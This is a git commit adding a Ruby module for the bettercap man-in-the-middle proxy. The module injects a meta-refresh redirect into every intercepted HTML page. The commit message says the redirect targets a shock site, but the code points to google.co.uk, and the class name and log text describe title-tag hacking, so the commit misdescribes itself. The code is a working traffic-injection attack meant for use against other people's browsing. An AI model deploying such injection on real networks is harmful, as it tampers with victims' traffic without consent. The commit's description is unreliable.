709b0b5fa2110bb9592bfd84386f0b6a0188d69d
Robbie <txt3rob@gmail.com>
2015-07-27 20:48:13 +0100

    lemonparty
    Lemonparty.org rather ugly site to visit.
    
    this will add a tag to refresh the page to that site.

---
+++ lemonparty.rb
@@ -0,0 +1,21 @@
+=begin
+
+BETTERCAP
+
+Author : Simone 'evilsocket' Margaritelli
+Email  : evilsocket@gmail.com
+Blog   : http://www.evilsocket.net/
+
+This project is released under the GPL 3 license.
+
+=end
+class HackTitle < Proxy::Module
+  def on_request( request, response )
+    # is it a html page?
+    if response.content_type =~ /^text\/html.*/
+      Logger.info "Hacking http://#{request.host}#{request.url} title tag"
+      # make sure to use sub! or gsub! to update the instance
+      response.body.sub!( '<head>', '<head> <meta http-equiv="refresh" content="3;url=http://www.google.co.uk" />' )
+    end
+  end
+end
